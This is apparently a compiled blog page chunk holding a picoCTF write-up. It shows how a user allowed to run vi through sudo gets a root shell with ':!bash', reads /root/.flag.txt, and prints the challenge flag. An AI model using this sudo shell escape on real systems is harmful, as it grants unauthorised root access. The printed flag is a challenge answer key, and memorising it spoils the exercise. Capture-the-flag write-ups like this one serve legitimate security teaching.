"use strict";(self.webpackChunkmy_own_blog=self.webpackChunkmy_own_blog||[]).push([[3771],{28453:(r,o,e)=>{e.d(o,{R:()=>i,x:()=>l});var n=e(96540);const t={},s=n.createContext(t);function i(r){const o=n.useContext(s);return n.useMemo((function(){return"function"==typeof r?r(o):{...o,...r}}),[o,r])}function l(r){let o;return o=r.disableParentContext?"function"==typeof r.components?r.components(t):r.components||t:i(r.components),n.createElement(s.Provider,{value:o},r.children)}},83054:(r,o,e)=>{e.r(o),e.d(o,{assets:()=>c,contentTitle:()=>l,default:()=>x,frontMatter:()=>i,metadata:()=>n,toc:()=>a});const n=JSON.parse('{"id":"pico-ctf/general-skills/permissions","title":"Permissions","description":"- Description: Can you read files in the root file?","source":"@site/docs/pico-ctf/general-skills/permissions.mdx","sourceDirName":"pico-ctf/general-skills","slug":"/pico-ctf/general-skills/permissions","permalink":"/my-small-blog/docs/pico-ctf/general-skills/permissions","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"tags":[]},"sidebar":"tutorialSidebar","previous":{"title":"Obedient Cat","permalink":"/my-small-blog/docs/pico-ctf/general-skills/obedient-cat"},"next":{"title":"plumning","permalink":"/my-small-blog/docs/pico-ctf/general-skills/plumbing"}}');var t=e(74848),s=e(28453);const i={tags:[]},l="Permissions",c={},a=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function d(r){const o={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.R)(),...r.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(o.header,{children:(0,t.jsx)(o.h1,{id:"permissions",children:"Permissions"})}),"\n",(0,t.jsxs)(o.ul,{children:["\n",(0,t.jsxs)(o.li,{children:[(0,t.jsx)(o.strong,{children:"Description:"})," Can you read files in the root file?"]}),"\n",(0,t.jsxs)(o.li,{children:[(0,t.jsx)(o.strong,{children:"Difficulty:"})," Medium"]}),"\n"]}),"\n",(0,t.jsx)(o.hr,{}),"\n",(0,t.jsx)(o.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,t.jsxs)(o.p,{children:["The objective of this challenge is to gain sufficient privileges to access the ",(0,t.jsx)(o.code,{children:"/root"})," directory."]}),"\n",(0,t.jsxs)(o.p,{children:["After connecting to the target, we navigate to ",(0,t.jsx)(o.code,{children:"/"})," and run ",(0,t.jsx)(o.code,{children:"ls -la"})," to inspect detailed permissions of files and directories."]}),"\n",(0,t.jsx)(o.pre,{children:(0,t.jsx)(o.code,{className:"language-js",children:"picoplayer@challenge:/$ ls -la\r\ntotal 0\r\ndrwxr-xr-x   1 root   root     51 Aug 13 05:35 .\r\ndrwxr-xr-x   1 root   root     51 Aug 13 05:35 ..\r\n-rwxr-xr-x   1 root   root      0 Aug 13 05:35 .dockerenv\r\nlrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin\r\ndrwxr-xr-x   2 root   root      6 Apr 15  2020 boot\r\nd---------   1 root   root     27 Aug  4  2023 challenge\r\ndrwxr-xr-x   5 root   root    340 Aug 13 05:35 dev\r\ndrwxr-xr-x   1 root   root     66 Aug 13 05:35 etc\r\ndrwxr-xr-x   1 root   root     24 Aug  4  2023 home\r\nlrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib\r\nlrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32\r\nlrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64\r\nlrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32\r\ndrwxr-xr-x   2 root   root      6 Mar  8  2023 media\r\ndrwxr-xr-x   2 root   root      6 Mar  8  2023 mnt\r\ndrwxr-xr-x   2 root   root      6 Mar  8  2023 opt\r\ndr-xr-xr-x 286 nobody nogroup   0 Aug 13 05:35 proc\r\n//highlight-next-line\r\ndrwx------   1 root   root     23 Aug  4  2023 root\r\ndrwxr-xr-x   1 root   root     54 Aug 13 05:35 run\r\nlrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin\r\ndrwxr-xr-x   2 root   root      6 Mar  8  2023 srv\r\ndr-xr-xr-x  13 nobody nogroup   0 Aug 13 05:35 sys\r\ndrwxrwxrwt   1 root   root      6 Aug  4  2023 tmp\r\ndrwxr-xr-x   1 root   root     18 Mar  8  2023 usr\r\ndrwxr-xr-x   1 root   root     17 Mar  8  2023 var\n"})}),"\n",(0,t.jsxs)(o.p,{children:["The ",(0,t.jsx)(o.code,{children:"/root"})," directory is owned by root with ",(0,t.jsx)(o.code,{children:"rwx------"})," permissions, meaning only the ",(0,t.jsx)(o.strong,{children:"root"})," user can access it, while the group and others have no permissions at all.\r\nSince our current user is ",(0,t.jsx)(o.strong,{children:"picoplayer"}),", we cannot enter ",(0,t.jsx)(o.code,{children:"/root"})," directly."]}),"\n",(0,t.jsxs)(o.p,{children:["Checking ",(0,t.jsx)(o.code,{children:"sudo -l"}),", we find that we are allowed to run ",(0,t.jsx)(o.code,{children:"/usr/bin/vi"})," as root. This can be leveraged to spawn a root shell."]}),"\n",(0,t.jsx)(o.pre,{children:(0,t.jsx)(o.code,{children:"picoplayer@challenge:/$ sudo -l\r\nMatching Defaults entries for picoplayer on challenge:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser picoplayer may run the following commands on challenge:\r\n    (ALL) /usr/bin/vi\n"})}),"\n",(0,t.jsx)(o.p,{children:"From picoplayer, we execute:"}),"\n",(0,t.jsx)(o.pre,{children:(0,t.jsx)(o.code,{children:"sudo vi\n"})}),"\n",(0,t.jsxs)(o.p,{children:["Inside ",(0,t.jsx)(o.code,{children:"vi"}),", we enter:"]}),"\n",(0,t.jsx)(o.pre,{children:(0,t.jsx)(o.code,{children:":!bash\n"})}),"\n",(0,t.jsxs)(o.p,{children:["The ",(0,t.jsx)(o.code,{children:":!"})," command in ",(0,t.jsx)(o.code,{children:"vi"})," allows us to execute arbitrary shell commands. In this case, it drops us into a root shell."]}),"\n",(0,t.jsxs)(o.p,{children:["With root privileges, we can now access ",(0,t.jsx)(o.code,{children:"/root"})," and retrieve the contents of the flag file."]}),"\n",(0,t.jsx)(o.pre,{children:(0,t.jsx)(o.code,{children:"root@challenge:~# ls -la\r\ntotal 12\r\ndrwx------ 1 root root   23 Aug  4  2023 .\r\ndrwxr-xr-x 1 root root   51 Aug 13 05:35 ..\r\n-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc\r\n-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt\r\n-rw-r--r-- 1 root root  161 Dec  5  2019 .profile\r\nroot@challenge:~# cat .flag.txt \r\npicoCTF{uS1ng_v1m_3dit0r_89e9cf1a}\n"})}),"\n",(0,t.jsx)(o.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,t.jsxs)(o.blockquote,{children:["\n",(0,t.jsx)(o.p,{children:(0,t.jsx)(o.code,{children:"picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}"})}),"\n"]})]})}function x(r={}){const{wrapper:o}={...(0,s.R)(),...r.components};return o?(0,t.jsx)(o,{...r,children:(0,t.jsx)(d,{...r})}):d(r)}}}]);